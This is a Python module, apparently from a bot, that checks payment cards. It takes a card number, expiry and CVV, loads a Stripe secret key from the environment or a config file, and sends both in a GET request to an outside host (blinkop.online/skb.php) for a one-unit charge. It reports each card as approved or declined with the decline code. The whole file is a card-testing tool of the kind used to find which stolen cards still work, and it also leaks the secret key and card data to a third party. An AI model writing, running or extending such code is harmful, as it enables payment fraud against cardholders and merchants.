import aiohttp
import asyncio
import json
import os
import time


SK_API_BASE = "https://blinkop.online/skb.php"


def _get_stripe_key():
    sk = os.environ.get("SK_STRIPE_KEY", "")
    if sk:
        return sk
    cfg_path = os.path.join(os.path.dirname(__file__), "..", "skpk.json")
    try:
        with open(cfg_path) as f:
            data = json.load(f)
            return data.get("sk", data.get("key", ""))
    except (FileNotFoundError, json.JSONDecodeError):
        return ""


async def sk_api_check(cc, mm, yy, cvv):
    stripe_key = _get_stripe_key()
    if not stripe_key:
        return "Error - No SK key configured (set SK_STRIPE_KEY env or bot/skpk.json)"

    card = f"{cc}|{mm}|{yy}|{cvv}"
    url = f"{SK_API_BASE}?sk={stripe_key}&amount=1&lista={card}"
    start_time = time.time()
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=35)) as session:
            async with session.get(url) as response:
                text = await response.text()

                try:
                    data = json.loads(text)
                    ok_status = data.get("ok", False)
                    message = data.get("message", "No response")
                    decline_code = data.get("decline_code", "")

                    elapsed = round(time.time() - start_time, 2)

                    if ok_status:
                        return f"Approved - {message} [{elapsed}s]"
                    else:
                        detail = f"{message}"
                        if decline_code:
                            detail += f" ({decline_code})"
                        return f"Declined - {detail} [{elapsed}s]"
                except json.JSONDecodeError:
                    elapsed = round(time.time() - start_time, 2)
                    return f"Error - Invalid API response [{elapsed}s]"

    except asyncio.TimeoutError:
        elapsed = round(time.time() - start_time, 2)
        return f"Error - Timeout [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
